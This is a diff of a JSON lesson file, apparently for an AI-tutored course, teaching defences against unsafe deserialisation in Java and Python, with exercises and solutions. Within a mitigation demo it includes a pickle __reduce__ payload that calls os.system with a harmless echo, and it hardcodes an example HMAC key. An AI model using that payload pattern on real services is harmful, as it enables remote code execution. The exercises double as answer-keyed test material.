+          "description": "Shows how to create a safe deserialiser that blocks malicious callables like os.system.",
+          "difficulty": "advanced",
+          "code": "import pickle, io, os\n\n# Define which modules/classes are allowed\nSAFE_MODULES = {\n    'codec': {'myDecode', 'myEncode'},\n    'builtins': {'str', 'int', 'float', 'bool', 'list', 'dict', 'set', 'tuple'},\n}\n\nclass RestrictedUnpickler(pickle.Unpickler):\n    def find_class(self, module, name):\n        if module in SAFE_MODULES and name in SAFE_MODULES[module]:\n            return super().find_class(module, name)\n        raise pickle.UnpicklingError(\n            f'BLOCKED: {module}.{name} is not in the whitelist!')\n\ndef safe_loads(data):\n    return RestrictedUnpickler(io.BytesIO(data)).load()\n\n# Test 1: Normal data works fine\nnormal = pickle.dumps('Hello Server')\nprint(f'Normal: {safe_loads(normal)}')\n\n# Test 2: Attack is BLOCKED!\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('echo HACKED',))\n\nmalicious = pickle.dumps(Exploit())\ntry:\n    safe_loads(malicious)\nexcept pickle.UnpicklingError as e:\n    print(f'Attack blocked: {e}')",
+          "output": "Normal: Hello Server\nAttack blocked: BLOCKED: posix.system is not in the whitelist!",
+          "ai_explanation": "RestrictedUnpickler overrides find_class() — the method pickle calls to resolve module.class references. Our version checks a whitelist: only codec.myDecode, codec.myEncode, and basic Python types are allowed. When the malicious payload tries to use os.system (internally 'posix.system'), it is blocked with an exception. Normal data still works perfectly.",
+          "ai_challenge": "What would happen if you add 'os': {'getcwd'} to SAFE_MODULES? Would the attack still be blocked?"
+        },
+        {
+          "title": "Example 10: MITIGATION — Java ObjectInputFilter",
+          "description": "Java 9+ feature to whitelist allowed classes during deserialisation.",
+          "difficulty": "advanced",
+          "code": "import java.io.*;\n\npublic class FilteredDeserialisation {\n    public static void main(String[] args) throws Exception {\n        // Serialise a legitimate GameState\n        GameState game = new GameState(\"Alice\", 5, 2500);\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(game);\n        oos.close();\n\n        // Deserialise WITH filter\n        ObjectInputStream ois = new ObjectInputStream(\n            new ByteArrayInputStream(baos.toByteArray()));\n\n        ois.setObjectInputFilter(info -> {\n            Class<?> clazz = info.serialClass();\n            if (clazz == null) return ObjectInputFilter.Status.UNDECIDED;\n            // Only allow GameState and String\n            if (clazz == GameState.class || clazz == String.class)\n                return ObjectInputFilter.Status.ALLOWED;\n            System.out.println(\"BLOCKED: \" + clazz.getName());\n            return ObjectInputFilter.Status.REJECTED;\n        });\n\n        GameState loaded = (GameState) ois.readObject();\n        System.out.println(\"Safely loaded: \" + loaded);\n    }\n}",
+          "output": "Safely loaded: Alice | Level: 5 | Score: 2500",
+          "ai_explanation": "The ObjectInputFilter checks every class that the deserialiser tries to load. We only allow GameState and String — any attempt to deserialise Runtime, ProcessBuilder, or other dangerous classes would be REJECTED. This prevents gadget chain attacks where attackers chain together legitimate library classes to achieve code execution.",
+          "ai_challenge": "What happens if you try to deserialise an ArrayList<GameState>? Would you need to add ArrayList.class to the filter?"
+        },
+        {
+          "title": "Example 11: MITIGATION — JSON as Safe Alternative",
+          "description": "Replace native serialisation with JSON to eliminate code execution risk entirely.",
+          "difficulty": "intermediate",
+          "code": "import com.google.gson.Gson;\nimport com.google.gson.JsonSyntaxException;\n\npublic class JsonAlternative {\n    public static void main(String[] args) {\n        Gson gson = new Gson();\n\n        // Serialise to JSON (safe!)\n        GameState game = new GameState(\"Alice\", 5, 2500);\n        String json = gson.toJson(game);\n        System.out.println(\"JSON: \" + json);\n\n        // Deserialise from JSON (safe!)\n        GameState loaded = gson.fromJson(json, GameState.class);\n        System.out.println(\"Loaded: \" + loaded);\n\n        // Even malicious JSON cannot execute code!\n        String malicious = \"{\\\"playerName\\\": \\\"admin\\\", \\\"level\\\": 999}\";\n        GameState parsed = gson.fromJson(malicious, GameState.class);\n        System.out.println(\"From untrusted: \" + parsed);\n        // Still just data — no code execution possible!\n\n        // But ALWAYS validate!\n        if (parsed.level < 0 || parsed.level > 100) {\n            System.out.println(\"REJECTED: level out of range!\");\n        }\n    }\n}",
+          "output": "JSON: {\"playerName\":\"Alice\",\"level\":5,\"score\":2500}\nLoaded: Alice | Level: 5 | Score: 2500\nFrom untrusted: admin | Level: 999 | Score: 0\nREJECTED: level out of range!",
+          "ai_explanation": "JSON only carries data (strings, numbers, booleans). It CANNOT carry class metadata or method calls. Even if an attacker sends malicious JSON, the worst they can do is provide invalid values — which we catch with validation. No code execution is possible. This is why OWASP recommends JSON over native serialisation for untrusted data.",
+          "ai_challenge": "What if the JSON contains extra unexpected fields like {\"isAdmin\": true}? Will Gson ignore them or crash?"
+        },
+        {
+          "title": "Example 12: MITIGATION — HMAC Signing to Detect Tampering",
+          "description": "Use cryptographic signing to detect if serialised data has been modified.",
+          "difficulty": "advanced",
+          "code": "import javax.crypto.Mac;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.io.*;\nimport java.util.*;\n\npublic class HmacSerialisationDemo {\n    static final String SECRET = \"MySecretKey12345\"; // In production: use env variable!\n\n    static byte[] sign(byte[] data) throws Exception {\n        Mac mac = Mac.getInstance(\"HmacSHA256\");\n        mac.init(new SecretKeySpec(SECRET.getBytes(), \"HmacSHA256\"));\n        return mac.doFinal(data);\n    }\n\n    public static void main(String[] args) throws Exception {\n        // Serialise\n        int[] values = {1, 2, 3, 4};\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(values);\n        oos.close();\n        byte[] data = baos.toByteArray();\n        byte[] signature = sign(data);\n\n        System.out.println(\"Data: \" + data.length + \" bytes\");\n        System.out.println(\"HMAC: \" + Base64.getEncoder().encodeToString(signature));\n\n        // Verify BEFORE deserialising\n        byte[] verify = sign(data);\n        if (Arrays.equals(signature, verify)) {\n            System.out.println(\"Signature VALID — safe to deserialise\");\n        }\n\n        // Simulate tampering\n        data[data.length - 1] ^= 0xFF; // Flip last byte\n        byte[] badVerify = sign(data);\n        if (!Arrays.equals(signature, badVerify)) {\n            System.out.println(\"Signature INVALID — data was tampered!\");\n            System.out.println(\"REFUSING to deserialise!\");\n        }\n    }\n}",
+          "output": "Data: 37 bytes\nHMAC: k7x2m4...\nSignature VALID — safe to deserialise\nSignature INVALID — data was tampered!\nREFUSING to deserialise!",
+          "ai_explanation": "HMAC (Hash-based Message Authentication Code) creates a signature using a secret key. If even one byte of the serialised data is changed, the signature will not match. This prevents the byte-tampering attack. The process: serialise → sign → send (data + signature). Receiver: verify signature FIRST → only deserialise if valid. The secret key must never be shared with clients.",
+          "ai_challenge": "Why is HMAC better than a simple hash (like SHA-256 without a key)? What if the attacker knows the hash algorithm?"
+        },
+        {
+          "title": "Example 13: MITIGATION — The transient Keyword for Sensitive Data",
+          "description": "Exclude sensitive fields like passwords from serialisation using Java's transient keyword.",
+          "difficulty": "intermediate",
+          "code": "import java.io.*;\n\nclass BankAccount implements Serializable {\n    private static final long serialVersionUID = 1L;\n    String accountNumber;\n    double balance;\n    transient String password;    // NOT serialised!\n    transient String pin;         // NOT serialised!\n\n    public BankAccount(String acc, double bal, String pwd, String pin) {\n        this.accountNumber = acc;\n        this.balance = bal;\n        this.password = pwd;\n        this.pin = pin;\n    }\n\n    public String toString() {\n        return \"Account: \" + accountNumber + \" | Balance: £\" + balance +\n               \" | Password: \" + password + \" | PIN: \" + pin;\n    }\n}\n\npublic class TransientDemo {\n    public static void main(String[] args) throws Exception {\n        BankAccount acc = new BankAccount(\"GB12345\", 5000.0, \"s3cret!\", \"1234\");\n        System.out.println(\"Before: \" + acc);\n\n        // Serialise and deserialise\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        new ObjectOutputStream(baos).writeObject(acc);\n        BankAccount loaded = (BankAccount) new ObjectInputStream(\n            new ByteArrayInputStream(baos.toByteArray())).readObject();\n\n        System.out.println(\"After:  \" + loaded);\n        // password and pin are NULL after deserialisation!\n    }\n}",
+          "output": "Before: Account: GB12345 | Balance: £5000.0 | Password: s3cret! | PIN: 1234\nAfter:  Account: GB12345 | Balance: £5000.0 | Password: null | PIN: null",
+          "ai_explanation": "The 'transient' keyword tells Java: do NOT include this field in the serialised byte stream. After deserialisation, transient fields are set to their default values (null for objects, 0 for numbers). This is CWE-499 mitigation — preventing sensitive data (passwords, PINs, tokens) from being exposed in serialised form.",
+          "ai_challenge": "What happens if you need the password after deserialisation? How would you handle re-authentication?"
+        },
+        {
+          "title": "Example 14: Complete Defence-in-Depth Architecture",
+          "description": "Combines all mitigations into a comprehensive secure deserialisation system.",
+          "difficulty": "advanced",
+          "code": "import json\n\n# LAYER 1: Prefer JSON over native serialisation\ndef receive_data(raw_bytes):\n    try:\n        data = json.loads(raw_bytes.decode('utf-8'))\n    except (json.JSONDecodeError, UnicodeDecodeError) as e:\n        raise ValueError(f'Invalid JSON: {e}')\n\n    # LAYER 2: Validate data types\n    if not isinstance(data, dict):\n        raise ValueError('Expected JSON object')\n\n    # LAYER 3: Validate required fields\n    required = {'username': str, 'score': int, 'level': int}\n    for field, expected_type in required.items():\n        if field not in data:\n            raise ValueError(f'Missing field: {field}')\n        if not isinstance(data[field], expected_type):\n            raise ValueError(f'{field} must be {expected_type.__name__}')\n\n    # LAYER 4: Validate value ranges\n    if not (1 <= len(data['username']) <= 50):\n        raise ValueError('Username length out of range')\n    if not (0 <= data['score'] <= 1000000):\n        raise ValueError('Score out of range')\n    if not (1 <= data['level'] <= 100):\n        raise ValueError('Level out of range')\n\n    # LAYER 5: Sanitise strings\n    data['username'] = data['username'].strip()[:50]\n\n    print(f'Validated: {data}')\n    return data\n\n# Test with valid data\nvalid = b'{\"username\": \"alice\", \"score\": 2500, \"level\": 5}'\nreceive_data(valid)\n\n# Test with attack\nattack = b'{\"username\": \"admin\", \"score\": 999999999, \"level\": 999}'\ntry:\n    receive_data(attack)\nexcept ValueError as e:\n    print(f'BLOCKED: {e}')",
+          "output": "Validated: {'username': 'alice', 'score': 2500, 'level': 5}\nBLOCKED: Score out of range",
+          "ai_explanation": "This combines 5 defensive layers: (1) Use JSON instead of pickle/ObjectInputStream, (2) Validate data types, (3) Check required fields exist, (4) Validate value ranges, (5) Sanitise strings. Even if an attacker sends crafted JSON, they cannot execute code, and they cannot inject invalid values. This is defence-in-depth.",
+          "ai_challenge": "Add a 6th layer: logging. How would you log rejected requests for security monitoring without logging the actual malicious payload (which could be dangerous in log injection)?"
+        }
+      ],
+      "visual_diagram": {
+        "title": "Serialisation Attack Lifecycle: Normal → Attack → Mitigation",
+        "content": "<div style=\"font-family: monospace; line-height: 2.2; padding: 20px;\">\n\n<div style=\"text-align: center; margin-bottom: 30px;\">\n<span style=\"font-size: 20px; font-weight: bold; color: #2c3e50;\">🔄 SERIALISATION ATTACK LIFECYCLE: Normal → Attack → Mitigation</span>\n</div>\n\n<div style=\"text-align: center; margin-bottom: 10px;\">\n<span style=\"font-size: 16px; font-weight: bold; color: #2ecc71;\">━━━ PHASE 1: NORMAL OPERATION ━━━</span>\n</div>\n\n<span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">📦 OBJECT IN MEMORY</span>\n    <span style=\"color: #3498db;\">│</span>\n    <span style=\"color: #3498db;\">▼</span>\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">✅ SERIALISE (writeObject / pickle.dumps)</span>\n    <span style=\"color: #2ecc71;\">│ Converts object → byte stream</span>\n    <span style=\"color: #2ecc71;\">│ Header: ac ed 00 05 (Java magic bytes)</span>\n    <span style=\"color: #2ecc71;\">│ Class metadata + field values</span>\n    <span style=\"color: #2ecc71;\">▼</span>\n<span style=\"background: #f39c12; color: white; padding: 4px 12px; border-radius: 4px;\">📡 TRANSPORT (Network / File / Database)</span>\n    <span style=\"color: #f39c12;\">│</span>\n    <span style=\"color: #f39c12;\">▼</span>\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">✅ DESERIALISE (readObject / pickle.loads)</span>\n    <span style=\"color: #2ecc71;\">│ Reconstructs original object</span>\n    <span style=\"color: #2ecc71;\">▼</span>\n<span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">📦 OBJECT RESTORED ✓</span>\n\n\n<div style=\"text-align: center; margin: 20px 0 10px;\">\n<span style=\"font-size: 16px; font-weight: bold; color: #e74c3c;\">━━━ PHASE 2: ATTACK ━━━</span>\n</div>\n\n<span style=\"background: #e74c3c; color: white; padding: 4px 12px; border-radius: 4px;\">🔴 ATTACK TYPE 1: BYTE TAMPERING (Java)</span>\n    <span style=\"color: #e74c3c;\">│ Attacker intercepts byte stream</span>\n    <span style=\"color: #e74c3c;\">│ Changes: 00 00 00 03 → 00 00 00 05</span>\n    <span style=\"color: #e74c3c;\">│ Result: value 3 becomes value 5</span>\n    <span style=\"color: #e74c3c;\">│ Impact: Balance/score/role modified!</span>\n    <span style=\"color: #e74c3c;\">▼</span>\n<span style=\"background: #e74c3c; color: white; padding: 4px 12px; border-radius: 4px;\">⚡ CIA IMPACT: Integrity violated</span>\n\n<span style=\"background: #e74c3c; color: white; padding: 4px 12px; border-radius: 4px;\">🔴 ATTACK TYPE 2: PICKLE RCE (Python)</span>\n    <span style=\"color: #e74c3c;\">│ Attacker overrides __reduce__()</span>\n    <span style=\"color: #e74c3c;\">│ Returns: (os.system, ('malicious_cmd',))</span>\n    <span style=\"color: #e74c3c;\">│ Server calls pickle.loads(payload)</span>\n    <span style=\"color: #e74c3c;\">│ pickle calls os.system('malicious_cmd')</span>\n    <span style=\"color: #e74c3c;\">▼</span>\n<span style=\"background: #e74c3c; color: white; padding: 4px 12px; border-radius: 4px;\">⚡ CIA IMPACT: All three — C, I, A compromised!</span>\n\n<span style=\"color: #e74c3c;\">CWE-502: Deserialization of Untrusted Data</span>\n<span style=\"color: #e74c3c;\">OWASP A08:2021: Software and Data Integrity Failures</span>\n\n\n<div style=\"text-align: center; margin: 20px 0 10px;\">\n<span style=\"font-size: 16px; font-weight: bold; color: #2ecc71;\">━━━ PHASE 3: MITIGATION (Defence in Depth) ━━━</span>\n</div>\n\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">🛡️ LAYER 1: Avoid native serialisation</span>\n    <span style=\"color: #2ecc71;\">│ Use JSON/XML instead of pickle/ObjectInputStream</span>\n    <span style=\"color: #2ecc71;\">▼</span>\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">🛡️ LAYER 2: Class whitelisting</span>\n    <span style=\"color: #2ecc71;\">│ Java: ObjectInputFilter</span>\n    <span style=\"color: #2ecc71;\">│ Python: RestrictedUnpickler</span>\n    <span style=\"color: #2ecc71;\">▼</span>\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">🛡️ LAYER 3: Cryptographic signing (HMAC)</span>\n    <span style=\"color: #2ecc71;\">│ Detect byte tampering</span>\n    <span style=\"color: #2ecc71;\">▼</span>\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">🛡️ LAYER 4: Input validation</span>\n    <span style=\"color: #2ecc71;\">│ Check types, ranges, required fields</span>\n    <span style=\"color: #2ecc71;\">▼</span>\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">🛡️ LAYER 5: Least privilege</span>\n    <span style=\"color: #2ecc71;\">│ Never run servers as root</span>\n    <span style=\"color: #2ecc71;\">▼</span>\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">🛡️ LAYER 6: Sensitive field exclusion</span>\n    <span style=\"color: #2ecc71;\">│ Java: transient keyword (CWE-499)</span>\n    <span style=\"color: #2ecc71;\">▼</span>\n<span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">🔒 SECURE SYSTEM</span>\n\n\n<div style=\"margin-top: 30px; padding: 15px; background: #f8f9fa; border-left: 4px solid #3498db; border-radius: 4px;\">\n<span style=\"font-weight: bold; color: #2c3e50;\">🧠 REMEMBER:</span>\n<span style=\"color: #2c3e50;\">• Serialisation is SAFE when you control both ends</span>\n<span style=\"color: #e74c3c;\">• NEVER deserialise untrusted data with pickle.loads() or ObjectInputStream</span>\n<span style=\"color: #2ecc71;\">• JSON is ALWAYS safer than native serialisation for untrusted data</span>\n<span style=\"color: #9b59b6;\">• CWE-502 affects ALL languages: Java, Python, PHP, .NET, Ruby</span>\n<span style=\"color: #f39c12;\">• Defence in depth: use MULTIPLE layers, not just one fix</span>\n<span style=\"color: #3498db;\">• Ask: \"Who created these bytes?\" — if not YOU, treat them as hostile</span>\n</div>\n\n</div>"
+      },
+      "practice_exercises": [
+        {
+          "exercise_id": "ex_01",
+          "title": "Exercise 1: Implement Serializable Interface",
+          "description": "Make the Student class serialisable by implementing the correct interface.",
+          "difficulty": "beginner",
+          "category": "Serialisation Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's explore serialisation fundamentals! Make the Student class serialisable by implementing the correct interface.",
+          "starter_code": "// TODO: Make this class serialisable\npublic class Student {\n    private String name;\n    private int grade;\n\n    public Student(String name, int grade) {\n        this.name = name;\n        this.grade = grade;\n    }\n\n    public String toString() {\n        return name + \" (Grade: \" + grade + \")\";\n    }\n}",
+          "expected_output": "The Student class compiles and can be serialised with ObjectOutputStream",
+          "hints": [
+            {
+              "message": "Java requires a class to implement a specific interface before it can be serialised. What interface deals with converting objects to bytes?"
+            },
+            {
+              "message": "Add 'implements Serializable' to the class declaration. You also need to import java.io.Serializable."
+            },
+            {
+              "message": "Solution: import java.io.*;\npublic class Student implements Serializable {\n    private static final long serialVersionUID = 1L;\n    // ... rest stays the same\n}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_02",
+          "title": "Exercise 2: Serialise an Object to a File",
+          "description": "Write code to serialise a Student object and save it to 'student.ser'.",
+          "difficulty": "beginner",
+          "category": "Serialisation Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's explore serialisation fundamentals! Write code to serialise a Student object and save it to 'student.ser'.",
+          "starter_code": "import java.io.*;\n\npublic class SaveStudent {\n    public static void main(String[] args) throws Exception {\n        Student s = new Student(\"Bob\", 85);\n        // TODO: Serialise 's' to file 'student.ser'\n        // Use ObjectOutputStream and FileOutputStream\n\n        System.out.println(\"Saved: \" + s);\n    }\n}",
+          "expected_output": "Saved: Bob (Grade: 85)\n[File student.ser created]",
+          "hints": [
+            {
+              "message": "You need two streams: FileOutputStream to write to a file, and ObjectOutputStream wrapped around it to handle serialisation."
+            },
+            {
+              "message": "Create: ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"student.ser\")); then call oos.writeObject(s); and oos.close();"
+            },
+            {
+              "message": "Solution:\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"student.ser\"));\noos.writeObject(s);\noos.close();\nSystem.out.println(\"Saved: \" + s);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_03",
+          "title": "Exercise 3: Deserialise an Object from a File",
+          "description": "Read the Student object back from 'student.ser' and print it.",
+          "difficulty": "beginner",
+          "category": "Serialisation Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's explore serialisation fundamentals! Read the Student object back from 'student.ser' and print it.",
+          "starter_code": "import java.io.*;\n\npublic class LoadStudent {\n    public static void main(String[] args) throws Exception {\n        // TODO: Read Student from 'student.ser'\n        // Use ObjectInputStream and FileInputStream\n        // Cast the result to Student\n\n        // System.out.println(\"Loaded: \" + student);\n    }\n}",
+          "expected_output": "Loaded: Bob (Grade: 85)",
+          "hints": [
+            {
+              "message": "ObjectInputStream is the reverse of ObjectOutputStream. Wrap it around a FileInputStream."
+            },
+            {
+              "message": "ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"student.ser\")); Student student = (Student) ois.readObject();"
+            },
+            {
+              "message": "Solution:\nObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"student.ser\"));\nStudent student = (Student) ois.readObject();\nois.close();\nSystem.out.println(\"Loaded: \" + student);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_04",
+          "title": "Exercise 4: Predict the Output: serialVersionUID Mismatch",
+          "description": "What happens when you try to deserialise with a different serialVersionUID?",
+          "difficulty": "beginner",
+          "category": "Serialisation Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's explore serialisation fundamentals! What happens when you try to deserialise with a different serialVersionUID?",
+          "starter_code": "// Version 1: serialised with this\nclass Product implements Serializable {\n    private static final long serialVersionUID = 1L;\n    String name;\n}\n\n// Version 2: trying to deserialise with this\nclass Product implements Serializable {\n    private static final long serialVersionUID = 2L;\n    String name;\n    double price;\n}\n\n// What exception is thrown when deserialising V1 data with V2 class?\n// TODO: Write your answer as a comment",
+          "expected_output": "java.io.InvalidClassException: Product; local class incompatible",
+          "hints": [
+            {
+              "message": "When the serialVersionUID in the file does not match the class, Java considers them incompatible."
+            },
+            {
+              "message": "The exception is InvalidClassException — it means the class version changed between serialisation and deserialisation."
+            },
+            {
+              "message": "Answer: java.io.InvalidClassException is thrown because serialVersionUID 1 != 2. Always keep serialVersionUID consistent when maintaining backward compatibility."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_05",
+          "title": "Exercise 5: Python pickle: Serialise and Deserialise a Dictionary",
+          "description": "Use Python's pickle module to serialise a config dictionary and restore it.",
+          "difficulty": "beginner",
+          "category": "Serialisation Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's explore serialisation fundamentals! Use Python's pickle module to serialise a config dictionary and restore it.",
+          "starter_code": "import pickle\n\nconfig = {\n    'host': 'localhost',\n    'port': 8080,\n    'debug': False,\n    'allowed_users': ['alice', 'bob']\n}\n\n# TODO: Serialise config to bytes using pickle.dumps()\n# serialised = ???\n\n# TODO: Deserialise back using pickle.loads()\n# restored = ???\n\n# print(f'Original: {config}')\n# print(f'Restored: {restored}')\n# print(f'Match: {config == restored}')",
+          "expected_output": "Original: {'host': 'localhost', 'port': 8080, 'debug': False, 'allowed_users': ['alice', 'bob']}\nRestored: {'host': 'localhost', 'port': 8080, 'debug': False, 'allowed_users': ['alice', 'bob']}\nMatch: True",
+          "hints": [
+            {
+              "message": "pickle.dumps() converts a Python object to bytes. pickle.loads() converts bytes back to an object."
+            },
+            {
+              "message": "serialised = pickle.dumps(config) and restored = pickle.loads(serialised)"
+            },
+            {
+              "message": "Solution:\nserialised = pickle.dumps(config)\nrestored = pickle.loads(serialised)\nprint(f'Original: {config}')\nprint(f'Restored: {restored}')\nprint(f'Match: {config == restored}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_06",
+          "title": "Exercise 6: Identify the Magic Bytes",
+          "description": "Look at these hex bytes and identify what type of serialised data this is.",
+          "difficulty": "beginner",
+          "category": "Serialisation Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's explore serialisation fundamentals! Look at these hex bytes and identify what type of serialised data this is.",
+          "starter_code": "// Examine this byte sequence:\n// ac ed 00 05 73 72 00 0b ...\n\n// TODO: Answer these questions as comments:\n// 1. What do the first two bytes 'ac ed' indicate?\n// 2. What does '00 05' represent?\n// 3. What does '73' mean?\n// 4. What does '72' mean?\n// 5. What language produced this serialised data?",
+          "expected_output": "1. ac ed = Java serialisation magic number\n2. 00 05 = Protocol version 5\n3. 73 = TC_OBJECT (new object)\n4. 72 = TC_CLASSDESC (class description)\n5. Java",
+          "hints": [
+            {
+              "message": "The 'ac ed' bytes at the start are a signature — like a file extension but inside the data. They tell you what format this is."
+            },
+            {
+              "message": "ac ed is the Java serialisation magic number. 00 05 is version 5. 73 means 'here comes a new object' (TC_OBJECT). 72 means 'here is the class description' (TC_CLASSDESC)."
+            },
+            {
+              "message": "Full answers:\n1. ac ed = Java serialisation stream magic number\n2. 00 05 = Stream version 5\n3. 73 = TC_OBJECT marker\n4. 72 = TC_CLASSDESC marker\n5. Java (ac ed is unique to Java serialisation)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_07",
+          "title": "Exercise 7: pickle.dumps() vs pickle.dump()",
+          "description": "Explain the difference between dumps/loads (bytes) and dump/load (files).",
+          "difficulty": "beginner",
+          "category": "Serialisation Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's explore serialisation fundamentals! Explain the difference between dumps/loads (bytes) and dump/load (files).",
+          "starter_code": "import pickle\n\ndata = {'key': 'value', 'number': 42}\n\n# Method 1: dumps/loads — works with BYTES\n# TODO: Serialise data to bytes variable\n# byte_data = ???\n# restored1 = ???\n\n# Method 2: dump/load — works with FILES\n# TODO: Serialise data to file 'data.pkl'\n# with open('data.pkl', 'wb') as f:\n#     ???\n\n# TODO: Load from file\n# with open('data.pkl', 'rb') as f:\n#     restored2 = ???\n\n# print(f'From bytes: {restored1}')\n# print(f'From file: {restored2}')",
+          "expected_output": "From bytes: {'key': 'value', 'number': 42}\nFrom file: {'key': 'value', 'number': 42}",
+          "hints": [
+            {
+              "message": "The 's' in dumps/loads stands for 'string' (bytes). Without 's', dump/load work with file objects."
+            },
+            {
+              "message": "byte_data = pickle.dumps(data), restored1 = pickle.loads(byte_data). For files: pickle.dump(data, f) and pickle.load(f)."
+            },
+            {
+              "message": "Solution:\nbyte_data = pickle.dumps(data)\nrestored1 = pickle.loads(byte_data)\nwith open('data.pkl', 'wb') as f:\n    pickle.dump(data, f)\nwith open('data.pkl', 'rb') as f:\n    restored2 = pickle.load(f)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_08",
+          "title": "Exercise 8: Serialise Multiple Objects",
+          "description": "Serialise three different Student objects to the same file and read them all back.",
+          "difficulty": "beginner",
+          "category": "Serialisation Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's explore serialisation fundamentals! Serialise three different Student objects to the same file and read them all back.",
+          "starter_code": "import java.io.*;\n\npublic class MultiSerialise {\n    public static void main(String[] args) throws Exception {\n        Student s1 = new Student(\"Alice\", 90);\n        Student s2 = new Student(\"Bob\", 75);\n        Student s3 = new Student(\"Charlie\", 88);\n\n        // TODO: Serialise all three to 'students.ser'\n        // Remember: you can call writeObject() multiple times\n\n        // TODO: Deserialise all three back\n        // Read in the SAME ORDER you wrote them\n\n        // Print all three\n    }\n}",
+          "expected_output": "Loaded: Alice (Grade: 90)\nLoaded: Bob (Grade: 75)\nLoaded: Charlie (Grade: 88)",
+          "hints": [
+            {
+              "message": "You can call writeObject() multiple times on the same ObjectOutputStream. When reading, call readObject() the same number of times."
+            },
+            {
+              "message": "Write: oos.writeObject(s1); oos.writeObject(s2); oos.writeObject(s3); Read: (Student) ois.readObject() three times."
+            },
+            {
+              "message": "Solution:\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"students.ser\"));\noos.writeObject(s1); oos.writeObject(s2); oos.writeObject(s3); oos.close();\nObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"students.ser\"));\nfor (int i = 0; i < 3; i++) {\n    System.out.println(\"Loaded: \" + (Student) ois.readObject());\n}\nois.close();"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_09",
+          "title": "Exercise 9: What Makes Serialisation Dangerous?",
+          "description": "Identify which of these scenarios is SAFE and which is DANGEROUS for deserialisation.",
+          "difficulty": "beginner",
+          "category": "Serialisation Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's explore serialisation fundamentals! Identify which of these scenarios is SAFE and which is DANGEROUS for deserialisation.",
+          "starter_code": "// For each scenario, write SAFE or DANGEROUS and explain why:\n\n// Scenario 1: Loading a game save file that your own game created\n// Answer: ???\n\n// Scenario 2: Receiving pickle data from a client over the internet\n// Answer: ???\n\n// Scenario 3: Reading serialised config from an encrypted database that only admins can write\n// Answer: ???\n\n// Scenario 4: Accepting serialised Java objects in an HTTP POST parameter\n// Answer: ???\n\n// Scenario 5: Two servers you control exchanging data over TLS\n// Answer: ???",
+          "expected_output": "1. SAFE — you control both ends\n2. DANGEROUS — client is untrusted, could send malicious pickle\n3. SAFE — trusted source with access control\n4. DANGEROUS — HTTP parameters come from untrusted users\n5. SAFE — you control both servers and the channel is encrypted",
+          "hints": [
+            {
+              "message": "The key question is: 'Who created the serialised data?' If YOU created it, it is safe. If a USER or EXTERNAL CLIENT created it, it is dangerous."
+            },
+            {
+              "message": "Scenarios 1, 3, 5 are SAFE (trusted sources). Scenarios 2, 4 are DANGEROUS (untrusted sources)."
+            },
+            {
+              "message": "Full answers:\n1. SAFE — your own game wrote the data\n2. DANGEROUS — pickle.loads() on client data = RCE\n3. SAFE — admins only, encrypted storage\n4. DANGEROUS — anyone can craft malicious serialised objects\n5. SAFE — both ends controlled, TLS encrypted"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_10",
+          "title": "Exercise 10: Compare Serialisation Across Languages",
+          "description": "Fill in the table showing serialisation methods for Java, Python, and JavaScript.",
+          "difficulty": "beginner",
+          "category": "Serialisation Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's explore serialisation fundamentals! Fill in the table showing serialisation methods for Java, Python, and JavaScript.",
+          "starter_code": "// Fill in the blanks:\n//\n// Language | Serialise Method          | Deserialise Method         | Dangerous?\n// --------|--------------------------|---------------------------|----------\n// Java    | ObjectOutputStream.???    | ObjectInputStream.???      | ???\n// Python  | pickle.???               | pickle.???                 | ???\n// JS      | JSON.???                 | JSON.???                   | ???\n// Python  | json.???                 | json.???                   | ???\n//\n// Which methods can execute arbitrary code during deserialisation?\n// Answer: ???",
+          "expected_output": "Java: writeObject / readObject — YES dangerous\nPython pickle: dumps / loads — YES dangerous\nJS JSON: stringify / parse — NO safe\nPython json: dumps / loads — NO safe\nDangerous: ObjectInputStream.readObject() and pickle.loads()",
+          "hints": [
+            {
